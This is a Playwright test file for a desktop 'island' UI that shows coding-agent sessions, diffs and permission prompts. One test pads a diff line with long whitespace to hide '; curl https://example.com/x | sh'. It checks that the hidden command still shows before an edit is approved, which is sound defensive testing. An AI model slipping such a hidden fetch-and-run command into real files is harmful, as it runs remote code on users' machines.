import { expect, test, type Page } from "@playwright/test";

/// Presses one of the preview harness's buttons, which stand in for what the app would send.
async function send(page: Page, name: string): Promise<void> {
  await page.locator(".harness").getByRole("button", { name, exact: true }).click();
}

/// Sends an event as the app would, through the page's own preview channel.
async function emit(page: Page, name: string, payload: unknown): Promise<void> {
  await page.evaluate(
    async ([event, data]) => {
      // Imported in the page, where the dev server serves it; the module is the island's own.
      const where = "/src/island/channels.ts";
      const channels = (await import(where)) as { emitPreview: (name: string, payload: unknown) => void };
      channels.emitPreview(event, data);
    },
    [name, payload] as const,
  );
}

async function opened(page: Page): Promise<void> {
  await send(page, "hover");
  await expect(page.locator(".tabs.shown")).toBeVisible();
}

async function folded(page: Page): Promise<void> {
  await send(page, "leave");
  await expect(page.locator(".tabs.shown")).toHaveCount(0);
}

async function sessionOpened(page: Page): Promise<void> {
  await send(page, "coding");
  await opened(page);
  await page.locator(".tabs .tab[title='coding']").click();
  await page.locator(".view.coding .row.opens").first().click();
  await send(page, "session detail");
  await expect(page.locator(".coding-detail .main .steps li")).toHaveCount(7);
}

/// A coding agent's question, sent by the harness and opened whole from what is waiting.
async function askOpened(page: Page, sample: string): Promise<void> {
  await opened(page);
  await send(page, sample);
  await page.locator(".tabs .tab[title='waiting on you']").click();
  await page.locator(".row.ask").getByRole("button", { name: "open" }).click();
  await expect(page.locator(".view.asked")).toBeVisible();
  // A click this soon after the question came into view is taken as aimed at what was there before.
  await page.waitForTimeout(500);
}

/// What the page asked of the host by one command, in order, as the preview records it.
async function commanded(page: Page, name: string): Promise<unknown[]> {
  return page.evaluate(async (wanted) => {
    const where = "/src/island/channels.ts";
    const channels = (await import(where)) as { previewed: Array<{ name: string; args?: unknown }> };
    return channels.previewed.filter((one) => one.name === wanted).map((one) => one.args);
  }, name);
}

test.beforeEach(async ({ page }) => {
  await page.goto("/island.html");
});

test("a hover held on the notch opens the island on its tabs", async ({ page }) => {
  await opened(page);
  await expect(page.locator(".tabs .tab")).not.toHaveCount(0);
});

test("every session is listed, past what fits, and only Claude Code's open", async ({ page }) => {
  const projects = ["kyuren", "website", "notes", "thesis", "dotfiles", "api", "mobile", "scripts", "papers"];
  await opened(page);
  await page.locator(".tabs .tab[title='coding']").click();
  await emit(page, "coding:sessions", {
    sessions: projects.map((project, at) => ({ id: `s${at}`, harness: at === 8 ? "codex" : "claude", project, state: "idle", active: Date.now() - at * 60_000 })),
  });
  await expect(page.locator(".view.coding .row")).toHaveCount(9);
  await expect(page.locator(".view.coding .row.opens")).toHaveCount(8);
  const scrolls = await page.locator(".view.coding").evaluate((list) => list.scrollHeight > list.clientHeight);
  expect(scrolls).toBe(true);
});

test("a session opens to its steps, a command to all of itself, and a change to its diff in green and red", async ({ page }) => {
  await sessionOpened(page);
  await page.locator(".coding-detail .main .steps li", { hasText: "pnpm bundle" }).first().click();
  await expect(page.locator(".step-head .title")).toHaveText("run pnpm bundle");
  await expect(page.locator(".step-detail .command")).toHaveText('pnpm bundle > /tmp/bundle.log 2>&1\necho "exit $?"\ntail -5 /tmp/bundle.log');
  await expect(page.locator(".step-detail .ended")).toHaveText("Ended with code 1.");
  await expect(page.getByRole("button", { name: "Show all 260 lines" })).toBeVisible();

  await page.locator(".step-head .up").click();
  await page.locator(".coding-detail .main .steps li", { hasText: "edit apps/desktop/src/island/island.css" }).click();
  await expect(page.locator(".step-detail .diff .add").first()).toHaveCSS("color", "rgb(166, 227, 161)");
  await expect(page.locator(".step-detail .diff .del").first()).toHaveCSS("color", "rgb(243, 139, 168)");
});

test("an agent's step opens to its own steps, and those open the same way", async ({ page }) => {
  await sessionOpened(page);
  await page.locator(".coding-detail .main .steps li", { hasText: "hand to an agent" }).click();
  await expect(page.locator(".step-detail .about").first()).toHaveText("Review the change");
  await page.locator(".step-detail .steps li", { hasText: "git diff --stat" }).click();
  await expect(page.locator(".step-detail .command")).toHaveText("git diff --stat");
  await page.locator(".step-head .up").click();
  await expect(page.locator(".step-head .title")).toHaveText("hand to an agent Review the change");
});

test("the test result opens the run that gave it, and a file the steps that changed it", async ({ page }) => {
  await sessionOpened(page);
  await page.locator(".coding-detail .tests").click();
  await expect(page.locator(".step-head .title")).toHaveText("run cargo test 2>&1 | tail -3");
  await page.locator(".step-head .up").click();
  await page.locator(".coding-detail .file").first().click();
  await expect(page.locator(".coding-detail .main .steps li")).toHaveCount(1);
});

test("a fold by accident keeps the place, the step still open when the island comes back", async ({ page }) => {
  await sessionOpened(page);
  await page.locator(".coding-detail .main .steps li", { hasText: "pnpm bundle" }).first().click();
  await expect(page.locator(".step-head .title")).toHaveText("run pnpm bundle");
  await folded(page);
  await opened(page);
  await expect(page.locator(".tabs .tab.on")).toHaveAttribute("title", "coding");
  await expect(page.locator(".step-head .title")).toHaveText("run pnpm bundle");
});

test("a turn that ends is told either side of the notch, green when its tests passed and red when not", async ({ page }) => {
  await send(page, "turn done");
  await expect(page.locator(".wing.left.shown")).toHaveText("kyuren finished");
  await expect(page.locator(".wing.right.shown.healthy")).toHaveText("39 passed · 3 files changed");
  await expect(page.locator(".wing.shown")).toHaveCount(0, { timeout: 8_000 });
  await send(page, "turn failed");
  await expect(page.locator(".wing.right.shown.failed")).toHaveText("2 failed · 1 file changed");
});

test("the volume follows the slider as it moves, and what the player says meanwhile does not move it back", async ({ page }) => {
  const playing = { player: "spotify", title: "Pastel Rain", artist: "Sangatsu no Phantasia", album: "", duration: 211, position: 41, at: Date.now(), playing: true, track: "t", volume: 64 };
  await send(page, "widgets");
  await opened(page);
  await page.locator(".tabs .tab[title='glance']").click();
  await emit(page, "music:now", playing);
  const slider = page.locator(".music .volume input");
  await page.locator(".widget.music").hover();
  await expect(slider).toBeVisible();
  await expect(slider).toHaveValue("64");

  // Turned on its side, the slider's low end is at its foot.
  const box = await slider.boundingBox();
  if (!box) throw new Error("the slider is not laid out");
  const x = box.x + box.width / 2;
  await page.mouse.move(x, box.y + box.height - 3);
  await page.mouse.down();
  await page.mouse.move(x, box.y + box.height * 0.3, { steps: 6 });
  const during = await slider.inputValue();
  expect(Number(during)).toBeGreaterThan(50);
  await emit(page, "music:now", { ...playing, volume: 5 });
  await page.waitForTimeout(150);
  await expect(slider).toHaveValue(during);

  await page.mouse.up();
  await emit(page, "music:now", { ...playing, volume: 30 });
  await expect(slider).toHaveValue("30");
});

test("an opened session shows what the agent said last, whole on a click, and offers to open where it runs", async ({ page }) => {
  await sessionOpened(page);
  const said = page.locator(".coding-detail .said");
  await expect(said).toContainText("Which of the two should I keep");
  await expect(said).not.toHaveClass(/whole/);
  const cut = (await said.boundingBox())?.height ?? 0;
  await said.click();
  await expect(said).toHaveClass(/whole/);
  expect((await said.boundingBox())?.height ?? 0, "all of it, once clicked").toBeGreaterThan(cut);
  await expect(page.locator(".coding-detail .reveal")).toHaveAttribute("title", "open in Claude");
  await page.locator(".coding-detail .file").first().click();
  await expect(said).toHaveCount(0, { timeout: 2_000 });
});

test("an empty page says so at its middle, the shelf as every other", async ({ page }) => {
  await opened(page);
  for (const tab of ["shelf", "coding", "at work", "noticed"]) {
    await page.locator(`.tabs .tab[title='${tab}']`).click();
    const offset = await page.locator(".content .view .empty").evaluate((empty) => {
      const box = empty.getBoundingClientRect();
      const content = (empty.closest(".content") as HTMLElement).getBoundingClientRect();
      return box.top + box.height / 2 - (content.top + content.height / 2);
    });
    expect(Math.abs(offset), `${tab}'s empty line, from the middle`).toBeLessThanOrEqual(1);
  }
});

test("a question Kyuren asks is shown whole on the island, since an answer is to all of it", async ({ page }) => {
  const target = `kyuren: ${"look into why the build fails on a clean checkout, ".repeat(4)}and say what to change`;
  await opened(page);
  await emit(page, "permission", { id: "q1", tool: "code", effect: "execute", target });
  await page.locator(".tabs .tab[title='waiting on you']").click();
  const shown = page.locator(".row.ask .target", { hasText: "say what to change" });
  await expect(shown).toBeVisible();
  expect(await shown.evaluate((one) => one.scrollWidth > one.clientWidth), "cut off at its end").toBe(false);
});

test("a question shows what would go with it, and says when it is asked because the user's notes were read", async ({ page }) => {
  await opened(page);
  await emit(page, "permission", {
    id: "q2",
    tool: "web_search",
    effect: "outbound",
    target: "https://html.duckduckgo.com",
    carrying: "the appointment on Thursday the note mentions",
    why: "this conversation has read your notes",
  });
  await page.locator(".tabs .tab[title='waiting on you']").click();
  await expect(page.locator(".row.ask .carrying")).toHaveText("sending the appointment on Thursday the note mentions");
  await expect(page.locator(".row.ask .why")).toHaveText("asked because this conversation has read your notes");
});

test("a question answered in the main window is gone from the island, which folds away once none is left", async ({ page }) => {
  await opened(page);
  await emit(page, "permission", { id: "q3", tool: "web_fetch", effect: "outbound", target: "https://example.com/paper" });
  await emit(page, "permission", { id: "q4", tool: "web_search", effect: "outbound", target: "https://html.duckduckgo.com" });
  await page.locator(".tabs .tab[title='waiting on you']").click();
  await expect(page.locator(".row.ask")).toHaveCount(2);
  await emit(page, "permission:answered", "q3");
  await expect(page.locator(".row.ask .target")).toHaveText(["https://html.duckduckgo.com"]);
  await folded(page);
  await expect(page.locator(".sign.shown")).toHaveText("1");
  await emit(page, "permission:answered", "q4");
  await expect(page.locator(".sign.shown")).toHaveCount(0);
});

test("a coding agent's questions are answered on the island, each with what was picked for it", async ({ page }) => {
  await askOpened(page, "agent choice");
  const answer = page.locator(".asked .foot").getByRole("button", { name: "answer" });
  const option = (label: string) => page.locator(".asked .option", { hasText: label });
  await expect(answer).toBeDisabled();
  await option("SQLite").click();
  await option("JSON files").click();
  await expect(option("SQLite")).toHaveAttribute("aria-pressed", "false");
  await expect(answer).toBeDisabled();
  await option("Lint").click();
  await option("Unit tests").click();
  await answer.click();
  await expect(page.locator(".view.asked")).toHaveCount(0);
  expect(await commanded(page, "coding_answer")).toEqual([
    { id: "agent-choice", decision: "allow", picked: { "Which store should hold the shelf?": ["JSON files"], "Which checks should run first?": ["Lint", "Unit tests"] } },
  ]);
});

test("a plan is read whole on the island, and approved in the mode chosen or sent back to be planned further", async ({ page }) => {
  await askOpened(page, "agent plan");
  await expect(page.locator(".asked .plan h4")).toHaveText("Move the shelf onto SQLite");
  await expect(page.locator(".asked .plan ol li")).toHaveCount(4);
  await expect(page.locator(".asked .plan p")).toHaveText("As the shelf's notes (https://example.com/shelf-notes) suggest:");
  await page.locator(".asked .foot").getByRole("button", { name: "keep planning" }).click();
  await askOpened(page, "agent plan");
  await page.locator(".asked .foot").getByRole("button", { name: "approve, accept edits" }).click();
  expect(await commanded(page, "coding_answer")).toEqual([
    { id: "agent-plan", decision: "deny" },
    { id: "agent-plan", decision: "allow", mode: "acceptEdits" },
  ]);
});

test("an edit shows each line it takes out in red and puts in in green before it is allowed", async ({ page }) => {
  await askOpened(page, "agent edit");
  await expect(page.locator(".asked .change-head .path")).toHaveText("apps/desktop/src/island/shelf.ts");
  const out = page.locator(".asked .diff .del");
  const put = page.locator(".asked .diff .add");
  await expect(out).toHaveText(["-const LIMIT = 12;"]);
  await expect(put).toHaveText(["+const LIMIT = 24;", "+const KEPT_FOR = 7 * 24 * 3_600_000;"]);
  await expect(out).toHaveCSS("color", "rgb(243, 139, 168)");
  await expect(put.first()).toHaveCSS("color", "rgb(166, 227, 161)");
  await page.locator(".asked .foot").getByRole("button", { name: "allow", exact: true }).click();
  expect(await commanded(page, "coding_answer")).toEqual([{ id: "agent-edit", decision: "allow" }]);
});

test("a server's form goes back with its values as the server asked for them, and says what does not read right", async ({ page }) => {
  await askOpened(page, "agent form");
  const sending = page.locator(".asked .foot").getByRole("button", { name: "send" });
  const field = (title: string) => page.locator(".asked .field", { hasText: title });
  await expect(sending).toBeDisabled();
  await field("Title").locator("input").fill("The build is slow");
  await field("Board").getByRole("button", { name: "Sprint" }).click();
  await expect(field("Points").locator(".title")).toHaveText("Points optional, 1 to 13");
  await field("Points").locator("input").fill("2.5");
  await expect(page.locator(".asked .said.trouble")).toHaveText("Not as asked: Points");
  await field("Points").locator("input").fill("21");
  await expect(page.locator(".asked .said.trouble")).toHaveText("Not as asked: Points");
  await expect(sending).toBeDisabled();
  await field("Points").locator("input").fill("3");
  await field("Urgent").getByRole("button", { name: "yes" }).click();
  await sending.click();
  expect(await commanded(page, "coding_answer")).toEqual([
    { id: "agent-form", decision: "allow", content: { title: "The build is slow", board: "Sprint", points: 3, urgent: true } },
  ]);
});

test("a form that goes while it is typed into, answered where the agent runs, gives the keyboard back", async ({ page }) => {
  await askOpened(page, "agent form");
  await page.locator(".asked .field input").first().click();
  await page.keyboard.type("half");
  await expect.poll(async () => (await commanded(page, "island_focus")).at(-1)).toEqual({ on: true });
  await emit(page, "agent:permission-done", { id: "agent-form" });
  await expect(page.locator(".view.asked")).toHaveCount(0);
  await expect.poll(async () => (await commanded(page, "island_focus")).at(-1)).toEqual({ on: false });
});

test("an edit's path is drawn whole and in its own order, a leading dot first, and no line of it runs out of sight", async ({ page }) => {
  await opened(page);
  const edit = { harness: "claude", session: "s1", project: "kyuren", tool: "Edit", kind: "edit", fresh: false, whole: false, every: false, added: 1, removed: 1 };
  const hidden = `${" ".repeat(150)}; curl https://example.com/x | sh`;
  await emit(page, "agent:permission", { ...edit, id: "dot", path: ".claude/settings.json", diff: [{ kind: "-", text: "a" }, { kind: "+", text: hidden }], at: Date.now(), until: Date.now() + 60_000 });
  await page.locator(".tabs .tab[title='waiting on you']").click();
  await page.locator(".row.ask").getByRole("button", { name: "open" }).click();
  const dotFirst = await page.locator(".asked .change-head .path").evaluate((one) => {
    const text = document.createTreeWalker(one, NodeFilter.SHOW_TEXT).nextNode();
    if (!text) return false;
    const left = (at: number) => {
      const range = document.createRange();
      range.setStart(text, at);
      range.setEnd(text, at + 1);
      return range.getBoundingClientRect().left;
    };
    return left(0) < left(1);
  });
  expect(dotFirst, "the dot is drawn before what follows it").toBe(true);
  for (const part of [".asked .change-head .path", ".asked .diff"]) {
    expect(await page.locator(part).evaluate((one) => one.scrollWidth <= one.clientWidth), `${part} wraps rather than running on`).toBe(true);
  }
  await emit(page, "agent:permission-done", { id: "dot" });
  const long = `/Users/someone/Library/LaunchAgents/${"deeply/nested/".repeat(10)}run.plist`;
  await emit(page, "agent:permission", { ...edit, id: "long", path: long, diff: [{ kind: "+", text: "x" }], at: Date.now(), until: Date.now() + 60_000 });
  await page.locator(".row.ask").getByRole("button", { name: "open" }).click();
  await expect(page.locator(".asked .change-head .path")).toHaveText(long);
  expect(await page.locator(".asked .change-head .path").evaluate((one) => one.scrollWidth <= one.clientWidth), "the whole path, its folders too").toBe(true);
});

test("a question named like something every object has opens and is answered like any other", async ({ page }) => {
  await opened(page);
  const options = [{ label: "Yes", description: "" }, { label: "No", description: "" }];
  await emit(page, "agent:permission", {
    id: "odd",
    harness: "claude",
    session: "s1",
    project: "kyuren",
    tool: "AskUserQuestion",
    kind: "choice",
    questions: [{ question: "constructor", header: "", options, multiSelect: false }, { question: "toString", header: "", options, multiSelect: true }],
    at: Date.now(),
    until: Date.now() + 60_000,
  });
  await page.locator(".tabs .tab[title='waiting on you']").click();
  await page.locator(".row.ask").getByRole("button", { name: "open" }).click();
  await page.waitForTimeout(500);
  await page.locator(".asked .question", { hasText: "constructor" }).locator(".option", { hasText: "Yes" }).click();
  await page.locator(".asked .question", { hasText: "toString" }).locator(".option", { hasText: "No" }).click();
  await page.locator(".asked .foot").getByRole("button", { name: "answer" }).click();
  expect(await commanded(page, "coding_answer")).toEqual([{ id: "odd", decision: "allow", picked: { constructor: ["Yes"], toString: ["No"] } }]);
});

test("a question kept open through a fold takes no click as the island comes back into view, only one made after", async ({ page }) => {
  await askOpened(page, "agent plan");
  await folded(page);
  await opened(page);
  const approve = page.locator(".asked .foot").getByRole("button", { name: "approve, accept edits" });
  await approve.dispatchEvent("click");
  expect(await commanded(page, "coding_answer"), "aimed at what was there before").toEqual([]);
  await page.waitForTimeout(500);
  await approve.click();
  expect(await commanded(page, "coding_answer")).toEqual([{ id: "agent-plan", decision: "allow", mode: "acceptEdits" }]);
});

test("a page that fails to draw says so in its place, the island and its other pages go on, and it is tried again when asked", async ({ page }) => {
  await opened(page);
  await emit(page, "agent:permission", { id: "bad", harness: "claude", session: "s1", project: "kyuren", tool: "AskUserQuestion", kind: "choice", questions: null, at: Date.now(), until: Date.now() + 60_000 });
  await page.locator(".tabs .tab[title='waiting on you']").click();
  const failed = page.locator(".content .view.failed");
  await expect(failed.locator(".empty")).toContainText("This page could not be shown:");
  await page.locator(".tabs .tab[title='coding']").click();
  await expect(page.locator(".content .view.coding")).toBeVisible();
  await page.locator(".tabs .tab[title='waiting on you']").click();
  await expect(failed).toBeVisible();
  await emit(page, "agent:permission-done", { id: "bad" });
  await failed.getByRole("button", { name: "try again" }).click();
  await expect(page.locator(".content .view.list .empty")).toHaveText("Nothing is waiting on you.");
});

test("an island that fails as a whole lets go of the screen and the keyboard, says so, and starts again", async ({ page }) => {
  await opened(page);
  await emit(page, "orb:state", { not: "a state" });
  await expect(page.locator(".island-failed")).toHaveText("The island ran into a problem and is starting again.");
  await expect(page.locator(".panel")).toHaveCount(0);
  const last = async (name: string) => (await commanded(page, name)).at(-1);
  expect(await last("island_rect"), "no part of the screen kept to catch clicks").toEqual({ x: 0, y: 0, width: 0, height: 0 });
  expect(await last("island_mode")).toEqual({ shown: false });
  expect(await last("island_focus")).toEqual({ on: false });
  expect((await commanded(page, "island_dismiss")).length, "a summons ended, with its microphone").toBeGreaterThan(0);
  await expect(page.locator(".panel")).toBeVisible({ timeout: 5_000 });
  await expect(page.locator(".island-failed")).toHaveCount(0);
  await opened(page);
});
